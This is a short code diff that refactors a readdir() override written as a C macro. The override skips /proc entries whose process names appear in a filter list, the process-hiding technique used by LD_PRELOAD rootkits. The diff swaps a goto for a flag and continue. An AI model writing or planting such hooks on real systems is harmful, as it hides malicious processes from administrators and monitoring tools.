@@ -2142,16 +2142,19 @@ struct dirent* readdir(DIR *dirp)                                       \
                 strcmp(dir_name, "/proc") == 0 &&                       \
                 get_process_name(dir->d_name, process_name)) {          \
                 int i;                                                  \
+                int should_hide = 0;                                    \
                 for(i = 0; process_to_filter[i]; i++) {                 \
                     if(strcmp(process_name, process_to_filter[i]) == 0) { \
-                        goto skip_process;                              \
+                        should_hide = 1;                                \
+                        break;                                          \
                     }                                                   \
+                }                                                       \
+                if(should_hide) {                                       \
+                    continue;                                           \
                 }                                                       \
             }                                                           \
         }                                                               \
         break;                                                          \
-skip_process:                                                           \
-        continue;                                                       \
     }                                                                   \
     return dir;                                                         \
 }
